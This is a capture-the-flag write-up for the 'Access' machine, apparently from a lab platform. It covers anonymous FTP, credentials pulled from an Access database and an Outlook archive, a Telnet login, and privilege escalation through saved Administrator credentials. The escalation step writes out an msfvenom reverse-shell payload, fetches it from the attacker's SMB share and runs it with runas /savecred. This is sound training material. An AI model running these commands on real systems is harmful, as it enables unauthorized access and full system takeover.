# Access

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Running the full port scan, I found that ports 21, 23 and 80 were open.&#x20;

### (21) FTP

FTP is configured to allow anonymous login and I found `backup.mdb`&#x20;

To obtain the .mdb file, I changed the FTP transfer mode to binary using the command `bin` and downloaded the file using `get backup.mdb`

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

I was able to view the tables using `mdb-tables backup.mdb`

The `auth_user` table caught my attention.

Using `mdb-export backup.mdb auth_user`, I found the following credentials.&#x20;

<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

Furthermore, I found `Access Control.zip` in the FTP server.&#x20;

Trying to unzip the file, I obtained `unsupported compression method 99`. Searching online for solution, I decided to use `7z` to unzip the folder.

Using the command `7z x Access\ Control.zip`, I found that it requires a password to unzip.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Trying the password obtained from `auth_user` table (access4u@security), I managed to successfully unzip the folder.

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

A file named `Access Control.pst` was being extracted. To view the contents of a `.pst` file, I used the command `readpst 'Access Control.pst`

Opening the email up, I found the credentials: `security:4Cc3ssC0ntr0ller`

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

### (23) Telnet

I managed to login using the credentials `security:4Cc3ssC0ntr0ller`

Found the user flag

<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

To show the currently stored credentials, use the command `cmdkey /list`

I obtained the following:

```
Target: Domain:interactive=ACCESS\\Administrator
                                                Type: Domain Password
User: ACCESS\\Administrator
```

It means that the Administrator credentials were stored in the target which allows the attackers to run commands impersonating the Administrator.

I generated a reverse shell payload using `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o reverse.exe`&#x20;

Transferred from kali to victim (`copy \10.10.14.6\share\reverse.exe reverse.exe`)

Run the reverse.exe as administrator using `runas /savecred /user:ACCESS\Administrator reverse.exe`

And I obtained a shell as the administrator.

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

